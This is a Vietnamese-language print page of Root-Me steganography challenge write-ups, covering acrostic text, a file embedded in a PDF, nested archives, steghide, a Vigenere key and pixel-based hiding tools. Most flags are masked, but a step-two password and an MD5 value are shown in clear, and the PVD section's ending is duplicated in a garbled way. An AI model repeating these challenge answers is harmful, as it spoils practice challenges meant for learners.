+<p><img src="Steganography/./media/image30.png" alt="" /></p>
+<p><strong>Flag:</strong> *******</p>
+<p><img src="Steganography/./media/image31.png" alt="" /></p>
+<blockquote>
+<p>Back to <a href="Steganography/index.html#table-of-contents">Table Of Contents</a></p>
+</blockquote>
+<hr />
+<h2 id="txt---george-and-alfred"><a class="header" href="#txt---george-and-alfred">TXT - George and Alfred</a></h2>
+<p>Link: <a href="https://www.root-me.org/en/Challenges/Steganography/TXT-George-and-Alfred">https://www.root-me.org/en/Challenges/Steganography/TXT-George-and-Alfred</a></p>
+<p>Mở challenge, ta tìm được đoạn text là bài thơ:</p>
+<p><img src="Steganography/./media/image32.png" alt="" /></p>
+<p>Ở cuối bài, người ta có để một cái hint:</p>
+<p><img src="Steganography/./media/image33.png" alt="" /></p>
+<p>Mở bài gốc, ta biết được, những từ đầu hàng ở đoạn cuối là lời mà Musset gửi đến Georges. Bản của challenge đã thay dòng <strong>“La réponse de Georges Sand :”</strong> à <strong>“De la même manière George Sand a répondu ceci :”.</strong> Dựa vào hint, ở trên, ta có thể đoán được “phrase cachée” là <strong>Cette Nuit</strong>. Thử flag thì thấy passed!</p>
+<p><strong>Flag:</strong> *******</p>
+<p><img src="Steganography/./media/image34.png" alt="" /></p>
+<blockquote>
+<p>Back to <a href="Steganography/index.html#table-of-contents">Table Of Contents</a></p>
+</blockquote>
+<hr />
+<h2 id="embedded-pdf"><a class="header" href="#embedded-pdf">Embedded PDF</a></h2>
+<p>Sử dụng <strong>pdf-parser</strong> để xem cấu trúc của file pdf:</p>
+<p><strong>pdf-parser -w epreuve_BAC_2004.pdf</strong></p>
+<p><img src="Steganography/./media/image35.png" alt="" /></p>
+<p>Ta thấy, file <strong>Hidden_b33rs.txt</strong> được embedded trong pdf. Do vậy, sử dụng <strong>peepdf</strong> để xem cấu trúc của stream thì thấy Filespec nằm ở object 78, từ đó, ta sẽ extract object 78 ra file:</p>
+<p><img src="Steganography/./media/image36.png" alt="" /></p>
+<p>Extract obect 78 ra hiddenpdf.txt:</p>
+<p><img src="Steganography/./media/image37.png" alt="" /></p>
+<p>File hiddenpdf.txt:</p>
+<p><img src="Steganography/./media/image38.png" alt="" /></p>
+<p>Data đã bị encode base64, decode nó và xem header thì phát hiện đây là file JFIF:</p>
+<p><img src="Steganography/./media/image39.png" alt="" /></p>
+<p>Xuất ra file hidden.jpg, ta có flag:</p>
+<p><img src="Steganography/./media/image40.png" alt="" /></p>
+<p><strong>Flag:</strong> *******</p>
+<p><img src="Steganography/./media/image41.png" alt="" /></p>
+<blockquote>
+<p>Back to <a href="Steganography/index.html#table-of-contents">Table Of Contents</a></p>
+</blockquote>
+<hr />
+<h2 id="kitty-spy"><a class="header" href="#kitty-spy">Kitty spy</a></h2>
+<p>Link: <a href="https://www.root-me.org/en/Challenges/Steganography/Kitty-spy">https://www.root-me.org/en/Challenges/Steganography/Kitty-spy</a></p>
+<p>Binwalk file ch16.jpg ta thấy được các file zip lồng trong file img:</p>
+<p><img src="Steganography/./media/image42.png" alt="" /></p>
+<p>Extract các file zip ra:</p>
+<p><img src="Steganography/./media/image43.png" alt="" /></p>
+<p><img src="Steganography/./media/image44.png" alt="" /></p>
+<p>Trong step 1, ta có:</p>
+<p><img src="Steganography/./media/image45.png" alt="" /></p>
+<p>Sử dụng stegsolve để xem ảnh dưới nhiều dạng:</p>
+<p><img src="Steganography/./media/image46.png" alt="" /></p>
+<p>Ta được flag ở step1: <strong>*******</strong> (hihi encrypted flag)</p>
+<p>Đến step2, ta unzip với pass là flag ở step1:</p>
+<p><img src="Steganography/./media/image47.png" alt="" /></p>
+<p>Đọc file README\#2.txt, ta nhận được một đoạn chữ số khả nghi là MD5: <strong>18574115dbcd47d71e7eb9da74e45bf2</strong></p>
+<p><img src="Steganography/./media/image48.png" alt="" /></p>
+<p>Sử dụng tool thử tìm đoạn plaintext của nó:</p>
+<p><img src="Steganography/./media/image49.png" alt="" /></p>
+<p>Ta có key: <strong>*******</strong> (hihi encrypted key). Sử dụng steghide để extract file từ monster.wav:</p>
+<p><img src="Steganography/./media/image50.png" alt="" /></p>
+<p>Ta tìm được password ở step 2: <strong>s3c0nDSt3pIsAls0D0n3</strong></p>
+<p>Đến step3, ta có một source web nghi ngờ. Mở file README trong source code, ta nhận được dòng có nội dung như kiểu QR Code sẽ là key ở web này liên quan đến flag:</p>
+<p><img src="Steganography/./media/image51.png" alt="" /></p>
+<p>Mở file LICENSE.md, ta nhận được một đoạn BrainFuck:</p>
+<p><img src="Steganography/./media/image52.png" alt="" /></p>
+<p>Decode và y như dự đoán rằng, có thể QR Code sẽ hỗ trợ ta ở step này:</p>
+<p><img src="Steganography/./media/image53.png" alt="" /></p>
+<p>Ở file index.html, ta có được message sau:</p>
+<p><img src="Steganography/./media/image54.png" alt="" /></p>
+<p>Tui bị dừng lại ở đây là chưa nghĩ ra hướng tiếp theo.</p>
+<blockquote>
+<p>Back to <a href="Steganography/index.html#table-of-contents">Table Of Contents</a></p>
+</blockquote>
+<hr />
+<h2 id="crypto-art"><a class="header" href="#crypto-art">Crypto Art</a></h2>
+<p><img src="Steganography/./media/image55.png" alt="" /></p>
+<p>Đây là file Netpbm với đuôi là .ppm.</p>
+<p>String file và ta được thông điệp:</p>
+<p><img src="Steganography/./media/image56.png" alt="" /></p>
+<p>Sử dụng dcode.fr để tiên đoán cipher và ta thấy nó hợp nhất Vigenere:</p>
+<p><img src="Steganography/./media/image57.png" alt="" /></p>
+<p>Sau một hồi không thể auto bruteforce được Vigenere thì bài này có lẽ cần phải có key mới có thể decode. Tìm hiểu về ppm thì em phát hiện nó có thể chèn thêm text vào trong đó (hide). Sử dụng npiet language để phiên dịch nó thử:</p>
+<p><img src="Steganography/./media/image58.png" alt="" /></p>
+<p>Cuối cùng ta có key: EYJF**** (hihi encrypted key)</p>
+<p>Decode và nhận kết quả:</p>
+<p><img src="Steganography/./media/image59.png" alt="" /></p>
+<p><strong>Flag:</strong> *******</p>
+<p><img src="Steganography/./media/image60.png" alt="" /></p>
+<blockquote>
+<p>Back to <a href="Steganography/index.html#table-of-contents">Table Of Contents</a></p>
+</blockquote>
+<hr />
+<h2 id="png---pixel-indicator-technique"><a class="header" href="#png---pixel-indicator-technique">PNG - Pixel Indicator Technique</a></h2>
+<p>Pixel Indicator Technique là kỹ thuật ẩn giấu thông tin vào pixel của ảnh. Sử dụng công cụ stegopit (chuyên cho PIT) để phân tích ảnh của challenge:</p>
+<p><img src="Steganography/./media/image61.png" alt="" /></p>
+<p>Và ta tìm được hidden data:</p>
+<p><strong>Flag:</strong> <strong>*******</strong></p>
+<p><img src="Steganography/./media/image62.png" alt="" /></p>
+<blockquote>
+<p>Back to <a href="Steganography/index.html#table-of-contents">Table Of Contents</a></p>
+</blockquote>
+<hr />
+<h2 id="png---pixel-value-differencing"><a class="header" href="#png---pixel-value-differencing">PNG - Pixel Value Differencing</a></h2>
+<p>Đây là challenge dựa trên kỹ thuật PVD (Pixel Value Differencing) để ẩn dấu message trong png. Tương tự challenge, ta sử dụng công cụ <strong>stegopvd (</strong><a href="https://gist.github.com/dhondta/feaf4f5fb3ed8d1eb7515abe8cde4880">Tinyscript steganography tool implementing the Pixel Value Differencing algorithm · GitHub</a>) để extract message:</p>
+<p><img src="Steganography/./media/image63.png" alt="" /></p>
+<p><strong>Flag:</strong> <strong>*******</strong></p>
+<p><img src="Steganography/./media/image64.png" alt="" />
+(**<a href="https://gist.github.com/dhondta/feaf4f5fb3ed8d1eb7515abe8cde4880">Tinyscript steganography tool implementing the Pixel Value Differencing algorithm · GitHub</a>) để extract message:</p>
+<p><img src="Steganography/./media/image63.png" alt="Graphical user interface Description automatically generated" /></p>
+<p><strong>Flag:</strong> <strong>*******</strong></p>
+<p><img src="Steganography/./media/image64.png" alt="A screenshot of a computer Description automatically generated" /></p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="disclaimer"><a class="header" href="#disclaimer">Disclaimer</a></h1>
+<p>This project is intended <strong>for educational purposes only</strong>.</p>
+<p>By using any materials, scripts, or walkthroughs provided in this repository, you agree to the following:</p>
+<ul>
+<li>You will not use any information or tools provided here for malicious or unauthorized purposes.</li>
+<li>All challenges and labs referenced are publicly accessible platforms or practice environments (e.g., Root-Me).</li>
+<li>The content is shared for the purpose of learning cybersecurity, penetration testing, and ethical hacking techniques.</li>
+<li>The author(s) are <strong>not responsible</strong> for any misuse, damage, or legal consequences resulting from the use of this content.</li>
+</ul>
+<p>If you're unsure about whether your actions are ethical or legal, you probably shouldn't do them.</p>
+<blockquote>
+<p><strong>Stay ethical. Hack responsibly. Learn continuously.</strong></p>
+</blockquote>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="contributors-1"><a class="header" href="#contributors-1">Contributors</a></h1>
+<p>Thank you to everyone who has contributed to this project! Your efforts help make this resource better for the community.</p>
+<h2 id="how-to-contribute"><a class="header" href="#how-to-contribute">How to Contribute</a></h2>
+<p>Just click the <code>git edit button</code> on which page you want to contribute (on the top right) and then follow that instructions.</p>
+<p>You also could visit the <a href="https://github.com/nh4ttruong/emtoor">repository</a>:</p>
+<ol>
+<li>Fork the repository and create your branch from <code>main</code>.</li>
+<li>Add your content or improvements at <code>root</code>:</li>
+</ol>
+<pre><code class="language-bash"> .
+├── Cross-Site-Scripting
+├── CSRF
+├── Forensics
+├── Javascript
+├── PHP
+├── SQL-Injection
+└── Steganography
+</code></pre>
+<ol start="3">
+<li>Open a pull request with a clear description of your changes.</li>
+</ol>
+<h2 id="contributors-list"><a class="header" href="#contributors-list">Contributors List</a></h2>
+<ul>
+<li><a href="https://github.com/nh4ttruong">nh4ttruong</a> (maintainer)</li>
+</ul>
+<hr />
+
+                    </main>
+
+                    <nav class="nav-wrapper" aria-label="Page navigation">
+                        <!-- Mobile navigation buttons -->
+
+
+                        <div style="clear: both"></div>
+                    </nav>
+                </div>
+            </div>
+
+            <nav class="nav-wide-wrapper" aria-label="Page navigation">
+
+            </nav>
+
+        </div>
+
+
+
+
+        <script>
+            window.playground_copyable = true;
+        </script>
+
+        <script src="ace-2a3cd908.js"></script>
+        <script src="mode-rust-2c9d5c9a.js"></script>
+        <script src="editor-16ca416c.js"></script>
+        <script src="theme-dawn-4493f9c8.js"></script>
+        <script src="theme-tomorrow_night-9dbe62a9.js"></script>
+
+        <script src="elasticlunr-ef4e11c1.min.js"></script>
+        <script src="mark-09e88c2c.min.js"></script>
+        <script src="searcher-9aeb6ddf.js"></script>
+
+        <script src="clipboard-1626706a.min.js"></script>
+        <script src="highlight-abc7f01d.js"></script>
+        <script src="book-9576a2db.js"></script>
+
+        <!-- Custom JS scripts -->
+        <script src="theme/js/medium-zoom-11d3e061.min.js"></script>
+        <script src="theme/js/image-zoom-07fd8d4c.js"></script>
+
+        <script>
+        window.addEventListener('load', function() {
+            window.setTimeout(window.print, 100);
+        });
+        </script>
+
+
+    </div>
+    </body>
+</html>
